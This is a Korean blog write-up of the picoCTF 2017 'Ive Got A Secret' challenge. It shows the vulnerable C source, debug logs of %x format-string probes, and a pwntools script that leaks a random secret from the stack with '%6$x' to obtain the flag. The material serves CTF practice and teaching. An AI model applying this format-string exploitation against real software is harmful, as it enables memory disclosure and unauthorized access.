---
layout: post
title: "[study] picoctf 2017 Ive got a secret"
description: "picoctf2017 문제 풀이"
date: 2017-06-15 20:00:00
category: study
tags:  [fsa]
---

[picoCTF 2017 : binary exploitation : level2 : Ive-Got-A-Secret](https://2017game.picoctf.com/game/level-2/challenge/Ive-Got-A-Secret)

Picoctf 2017 서버가 아직 살아있어서 좀더 풀어보기...

<!--more-->

## Source

```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF_LEN 64
char buffer[BUF_LEN];

int main(int argc, char** argv) {
    int fd = open("/dev/urandom", O_RDONLY);
    if(fd == -1){
        puts("Open error on /dev/urandom. Contact an admin\n");
        return -1;
    }
    int secret;
    if(read(fd, &secret, sizeof(int)) != sizeof(int)){
        puts("Read error. Contact admin!\n");
        return -1;
    }
    close(fd);
    printf("Give me something to say!\n");
    fflush(stdout);
    fgets(buffer, BUF_LEN, stdin);
    printf(buffer);

    int not_secret;
    printf("Now tell my secret in hex! Secret: ");
    fflush(stdout);
    scanf("%x", &not_secret);
    if(secret == not_secret){
        puts("Wow, you got it!");
        system("cat ./flag.txt");   
    }else{
        puts("As my friend says,\"You get nothing! You lose! Good day, Sir!\"");
    }

    return 0;
}
```


## Analysis

### 1. Guessing random number

처음에는 `/dev/urandom` 을 통한 값을 동일하게 얻기 위하여 노력을 했었다가... T_T;


### 2. Format String Bug

잘 안 되서 코드를 다시 보니... 앗, format string bug.

```c
    fgets(buffer, BUF_LEN, stdin);
    printf(buffer);
```

```
[DEBUG] Sent 0x2f bytes:
    'AAAA,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x\n'
[DEBUG] Received 0x7b bytes:
    'AAAA,40,f7fc7c20,8048792,1,ffffdd34,3d780ea4,3,f7fc73c4,ffffdca0,0,f7e37a63,8048740,0,0\n'

[DEBUG] Sent 0x2f bytes:
    'AAAA,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x\n'
[DEBUG] Received 0x7b bytes:
    'AAAA,40,f7fc7c20,8048792,1,ffffdd34,d198dcc6,3,f7fc73c4,ffffdca0,0,f7e37a63,8048740,0,0\n'

[DEBUG] Sent 0x2f bytes:
    'AAAA,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x\n'
[DEBUG] Received 0x7b bytes:
    'AAAA,40,f7fc7c20,8048792,1,ffffdd34,6d83f5bf,3,f7fc73c4,ffffdca0,0,f7e37a63,8048740,0,0\n'
```

`AAAA` 이후의 **6번째 값**이 계속 **바뀐다.**





## Exploit

```python
#!/usr/bin/env python2

from pwn import * 

HOST = 'shell2017.picoctf.com'
PORT = 58570

local = False
#local = True

if local:
    conn = process("./secret")
else:
    conn = remote(HOST, PORT)

elf = ELF("./secret")

context.log_level = 'debug'

if local:
    gdb.attach(conn)

print conn.recv(1024)

#conn.sendline("AAAA,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x")
conn.sendline("AAAA %6$x")

m = conn.recv(1024)
secret = m[5:13]
print "[+] secret = %s" % secret

conn.sendline(secret)

print conn.recv(1024)

conn.interactive()
```



